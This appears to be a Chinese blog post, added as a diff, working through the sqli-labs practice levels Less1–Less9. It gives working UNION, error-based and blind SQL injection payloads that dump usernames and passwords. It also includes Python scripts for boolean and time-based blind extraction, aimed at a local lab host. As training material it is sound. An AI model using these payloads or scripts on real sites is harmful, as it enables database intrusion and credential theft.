@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>sqli | LancePLM的博客</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+ 
+  
+    <link rel="icon" href="/../img/icon.png">
+  
+  
+  <script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle"></a>
+        
+          <a class="main-nav-link" href="/">首页</a>
+        
+          <a class="main-nav-link" href="/archives">归档</a>
+        
+          <a class="main-nav-link" href="/about">关于</a>
+        
+          <a class="main-nav-link" href="/board">留言</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-sqli" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="name">
+      sqli
+    </h1>
+  
+
+        <div class="article-meta">
+          <a href="/2023/12/24/sqli/" class="article-date">
+  <time datetime="2023-12-24T06:07:34.000Z" itemprop="datePublished">2023-12-24</time>
+</a>
+          
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="Less1-常规"><a href="#Less1-常规" class="headerlink" title="Less1(常规)"></a>Less1(常规)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224140912180.png" alt="image-20231224140912180"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224141512477.png" alt="image-20231224141512477"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224141537122.png" alt="image-20231224141537122"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 3--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224141716479.png" alt="image-20231224141716479"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;order by 4--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224141836994.png" alt="image-20231224141836994"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%27union%20select%201,2,3--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224141917252.png" alt="image-20231224141917252"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,database(),version()--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224143144262.png" alt="image-20231224143144262"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224143405497.png" alt="image-20231224143405497"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224143431292.png" alt="image-20231224143431292"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224143529919.png" alt="image-20231224143529919"></p>
+<h3 id="Less2"><a href="#Less2" class="headerlink" title="Less2"></a>Less2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224143821088.png" alt="image-20231224143821088"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224143919007.png" alt="image-20231224143919007"></p>
+<p>“双引号一样</p>
+<p>‘)单引号加括号一样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 order by 3</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224144149046.png" alt="image-20231224144149046"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 order by 4</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224144207847.png" alt="image-20231224144207847"></p>
+<p>Less1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,database(),version()--+</span><br><span class="line"></span><br><span class="line">?id=-1&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br><span class="line"></span><br><span class="line">?id=-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure>
+
+<h3 id="Less3"><a href="#Less3" class="headerlink" title="Less3"></a>Less3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224144350507.png" alt="image-20231224144350507"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1”--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224144429143.png" alt="image-20231224144429143"></p>
+<p>order by 3 或 4不能不报错，第一步错误</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)order by 4--+</span><br></pre></td></tr></table></figure>
+
+<p>‘)可行</p>
+<p>继续Less1后续操作</p>
+<h3 id="Less4"><a href="#Less4" class="headerlink" title="Less4"></a>Less4</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224144914333.png" alt="image-20231224144914333"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;)-- --</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224144929380.png" alt="image-20231224144929380"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;order by 3-- -</span><br><span class="line"></span><br><span class="line">?id=-1&#x27;union select 1,2,3--+</span><br><span class="line"></span><br><span class="line">?id=-1&#x27;union select 1,database(),version()--+</span><br><span class="line"></span><br><span class="line">?id=-1&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br><span class="line"></span><br><span class="line">?id=-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure>
+
+<h3 id="Less5-盲注1，报错"><a href="#Less5-盲注1，报错" class="headerlink" title="Less5(盲注1，报错)"></a>Less5(盲注1，报错)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224145130264.png" alt="image-20231224145130264"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224145154227.png" alt="image-20231224145154227"></p>
+<p>正确则输出“You are in………..”否则报错</p>
+<p>错误找出，但是网页无其他输出，只有判断对错，应该采用盲注</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and length((select database()))&gt;9-- -</span><br></pre></td></tr></table></figure>
+
+<p>用这句话来判断数据库名字长度</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224151505297.png" alt="image-20231224151505297"></p>
+<p>没有输出“You are in………..”代表长度没有大于9</p>
+<p>输入大于5显示“You are in………..”</p>
+<p>逐渐尝试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and length((select database()))=8-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224151957871.png" alt="image-20231224151957871"></p>
+<p>数据库长度为8</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and ascii(substr((select database()),1,1))=115--+</span><br></pre></td></tr></table></figure>
+
+<p>substr()中是要执行的语句，选择数据库，第一个1是代表数据库名要查询的哪一个字符，可以更改，上面我们知道了有8个字符，但是手动使用二分法算下去十分的消耗时间，只能靠python脚本来进行判断，第二个1则是需要提取的字符数量，一般只能一个一个判断，所以固定为1</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过二分法逐字符提取数据库名</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">erfen</span>(<span class="params">url</span>):</span><br><span class="line">    name = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">101</span>):  <span class="comment"># 遍历数据库名的每个字符位置</span></span><br><span class="line">        a = <span class="number">32</span></span><br><span class="line">        b = <span class="number">128</span></span><br><span class="line">        d = (a + b) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> a &lt; b:</span><br><span class="line">            Get = url + <span class="string">&quot;/**/and/**/ascii(substr(database(), &#123;0&#125;, 1))&gt;&#123;1&#125;-- -&quot;</span>.<span class="built_in">format</span>(i, d)</span><br><span class="line">            res = session.get(Get)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> res.text:  <span class="comment"># 检查响应文本是否包含指定字符串</span></span><br><span class="line">                a = d + <span class="number">1</span></span><br><span class="line">                d = (a + b) // <span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                b = d</span><br><span class="line">                d = (a + b) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> d == <span class="number">32</span>:  <span class="comment"># 如果字符ASCII码为32，即空格，表示数据库名结束</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        name += <span class="built_in">chr</span>(d)  <span class="comment"># 将ASCII码转换为字符并添加到结果中</span></span><br><span class="line">        <span class="built_in">print</span>(name)  <span class="comment"># 打印已提取的部分数据库名</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># return name  # 注释掉，直接输出数据库名称，没有过程</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&quot;http://192.168.2.100/sqli/Less-5/?id=1&#x27;&quot;</span></span><br><span class="line">    name = erfen(url)</span><br><span class="line">    <span class="comment"># print(name)  # 注释掉，直接输出数据库名称，没有过程</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224153101379.png" alt="image-20231224153101379"></p>
+<p>判断表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99--+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get = url + <span class="string">&quot;/**/and/**/ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;0&#125;,1))&gt;&#123;1&#125;-- -&quot;</span>.<span class="built_in">format</span>(i, d)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224154344250.png" alt="image-20231224154344250"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))&gt;99--+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((select group_concat(username,password) from users),1,1))&gt;50--+</span><br></pre></td></tr></table></figure>
+
+<p>后续更改python脚本即可</p>
+<h4 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h4><p>第二种报错注入</p>
+<p>更改 select database()部分代码来对数据库进行操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and (extractvalue(1,concat(0x7e,(select database()),0x7e)))-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="/sqli.assets/image-20231224155012289.png" alt="image-20231224155012289"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and (extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)))-- -</span><br></pre></td></tr></table></figure>
+
+<p>后续与上面的一样只需更改0x7e括号里的内容</p>
+<h3 id="Less6"><a href="#Less6" class="headerlink" title="Less6"></a>Less6</h3><p>先试错,试出id&#x3D;1后面为”时报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224162218732.png" alt="image-20231224162218732"></p>
+<p>然后就可以后续操作了</p>
+<p>报错注入</p>
+<p>显示数据库，能够运行，其他的跟less5一样了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;and (extractvalue(1,concat(0x7e,(select database()),0x7e)))-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224161806830.png" alt="image-20231224161806830"></p>
+<p>less5能够报错注入，说明盲注也行</p>
+<p>试一试，更改关键代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get = url + <span class="string">&quot;/**/and/**/ascii(substr(database(), &#123;0&#125;, 1))&gt;&#123;1&#125;-- -&quot;</span>.<span class="built_in">format</span>(i, d)	</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224163025942.png" alt="image-20231224163025942"></p>
+<p>其他部分与less5相同，改代码即可，注意改好substr里的内容即可。</p>
+<h3 id="Less7"><a href="#Less7" class="headerlink" title="Less7"></a>Less7</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224165344657.png" alt="image-20231224165344657"></p>
+<p>图片显示</p>
+<p>You have an error in your SQL syntax（您的SQL语法有错误） </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;-- -</span><br></pre></td></tr></table></figure>
+
+<p>加上– -仍然报错，表示不能以’– -结尾，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224170603969.png" alt="image-20231224170603969"></p>
+<p>‘)仍然报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;))-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224170937021.png" alt="image-20231224170937021"></p>
+<p>不报错了，可以和上面一样继续操作了</p>
+<p>报错注入一样</p>
+<p>盲注关键代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if &#x27;You are in.... Use outfile......&#x27; in res.text:</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224171445308.png" alt="image-20231224171445308"></p>
+<h3 id="Less8"><a href="#Less8" class="headerlink" title="Less8"></a>Less8</h3><p>正常情况</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224171726380.png" alt="image-20231224171726380"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224171647689.png" alt="image-20231224171647689"></p>
+<p>报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224171800120.png" alt="image-20231224171800120"></p>
+<p>正常</p>
+<p>个人这里感觉和第五关有点相似了</p>
+<p>先报错注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and length((select database()))&gt;9-- -</span><br></pre></td></tr></table></figure>
+
+<p>直接长度判读没有输出</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224172153432.png" alt="image-20231224172153432"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and length((select database()))=8-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224172224203.png" alt="image-20231224172224203"></p>
+<p>正常输出，基本确定报错注入能用，看Less5即可</p>
+<p>盲注关键代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&#x27;You are in...........&#x27;</span> <span class="keyword">in</span> res.text:</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224172443937.png" alt="image-20231224172443937"></p>
+<p>跟着Less5走即可。</p>
+<h3 id="Less9-盲注2"><a href="#Less9-盲注2" class="headerlink" title="Less9(盲注2)"></a>Less9(盲注2)</h3><p>时间盲注</p>
+<p>试过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;</span><br><span class="line">?id=1&#x27;)</span><br><span class="line">?id=1&quot;</span><br><span class="line">?id=1&quot;)</span><br><span class="line">?id=1&quot;))</span><br></pre></td></tr></table></figure>
+
+<p>都不报错，那么与之前的知识都无关</p>
+<p>查，选择时间盲注</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(1=1,sleep(5),1)--+</span><br></pre></td></tr></table></figure>
+
+<p>添加语句后</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224204323064.png" alt="image-20231224204323064"></p>
+<p>网站加载5s钟表示确实使用时间盲注</p>
+<p>先行编写时间盲注脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">url = <span class="string">&quot;http://192.168.2.37/sqli/Less-9/?id=1&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_data</span>():</span><br><span class="line">    data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">            params_get = url + <span class="string">f&quot;/**/and/**/if(ascii(substring((select database()),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>,sleep(5),0)--+&quot;</span></span><br><span class="line">            response = session.get(params_get)</span><br><span class="line">            <span class="keyword">if</span> response.elapsed.total_seconds() &gt; <span class="number">3</span>:</span><br><span class="line">                data += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(data)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    extract_data()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个会话，以便所有请求都在同一个会话中，有助于处理重定向和Cookies等</span></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义目标URL，这是一个已知存在SQL注入漏洞的网站</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.2.37/sqli/Less-9/?id=1&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过时间延迟漏洞逐字符提取数据库中的用户名和密码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_data</span>():</span><br><span class="line">    data = <span class="string">&#x27;&#x27;</span>  <span class="comment"># 初始化一个空字符串，用于存储提取出的字符</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):  <span class="comment"># 循环逐字符提取数据</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):  <span class="comment"># 对可打印字符的ASCII码范围进行遍历</span></span><br><span class="line">            <span class="comment"># 构建SQL注入payload，根据响应时间判断条件是否成立</span></span><br><span class="line">            params_get = url + <span class="string">f&quot;/**/and/**/if(ascii(substring((select database()),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>,sleep(5),0)--+&quot;</span></span><br><span class="line">            response = session.get(params_get)</span><br><span class="line">            <span class="keyword">if</span> response.elapsed.total_seconds() &gt; <span class="number">3</span>:  <span class="comment"># 如果响应时间大于3秒，则表示条件成立，进入了时间延迟</span></span><br><span class="line">                data += <span class="built_in">chr</span>(j)  <span class="comment"># 将ASCII码转换为字符并添加到结果中</span></span><br><span class="line">                <span class="built_in">print</span>(data)  <span class="comment"># 打印已提取的部分用户名或密码</span></span><br><span class="line">                <span class="keyword">break</span>  <span class="comment"># 跳出内部循环，进行下一个字符的提取</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行时间注入函数来获取用户名和密码</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    extract_data()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+</span><br><span class="line">逐一判断数据库字符</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231224205247183.png" alt="image-20231224205247183"></p>
